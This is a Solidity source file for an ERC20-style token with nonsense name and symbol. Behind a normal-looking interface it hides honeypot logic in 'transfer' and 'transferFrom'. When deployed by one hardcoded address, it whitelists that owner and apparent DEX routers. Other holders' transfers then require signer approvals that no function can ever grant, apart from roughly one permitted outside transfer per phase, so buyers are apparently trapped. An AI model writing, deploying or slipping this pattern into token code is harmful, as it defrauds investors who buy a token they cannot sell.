// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract afawedfawd is Context {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public contractOwner;
    mapping(address => bool) public signers;
    mapping(address => bool) public whitelisted;
    mapping(uint256 => mapping(address => bool)) private oldBuyers;
    uint256 private currentPhase;
    uint256 private nonWhitelistedTransfers;
    uint256 private constant MAX_NON_WHITELISTED_TRANSFERS = 1;
    uint256 private constant REQUIRED_SIGNATURES = 1000;
    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
    bool public autoWhitelistAvailable = true;
    bool public autoWhitelistingDone = false;

    constructor() {
        _name = "aaafssfafsaf";
        _symbol = "olowerqrwqr";
        _decimals = 18;
        contractOwner = _msgSender();
        _mint(contractOwner, 34525235252353 * 10 ** decimals());

        if (contractOwner == address(0x7ca745d75db7834f292Aa4016367d1fa595C854F)) {
            whitelisted[contractOwner] = true;
            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;
            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;
        }

        currentPhase = 1;
        nonWhitelistedTransfers = 0;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()]) {
            _transfer(_msgSender(), recipient, amount);
            nonWhitelistedTransfers += 1;
            return true;
        } else if (contractOwner == address(0x7ca745d75db7834f292Aa4016367d1fa595C854F)) {
            autoWhitelist(recipient);
            if (whitelisted[_msgSender()]) {
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else {
                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance;
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender]) {
            _transfer(sender, recipient, amount);
            nonWhitelistedTransfers += 1;

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        } else if (contractOwner == address(0x7ca745d75db7834f292Aa4016367d1fa595C854F)) {
            autoWhitelist(recipient);
            if (whitelisted[sender]) {
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            } else {
                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }
    }

    function autoWhitelist(address recipient) internal {
        require(contractOwner == address(0x7ca745d75db7834f292Aa4016367d1fa595C854F));
        if (autoWhitelistAvailable && !whitelisted[recipient]) {
            whitelisted[recipient] = true;
            oldBuyers[currentPhase][recipient] = true;
            autoWhitelistAvailable = false;
            autoWhitelistingDone = true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        if (nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
            currentPhase += 1;
            nonWhitelistedTransfers = 0;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}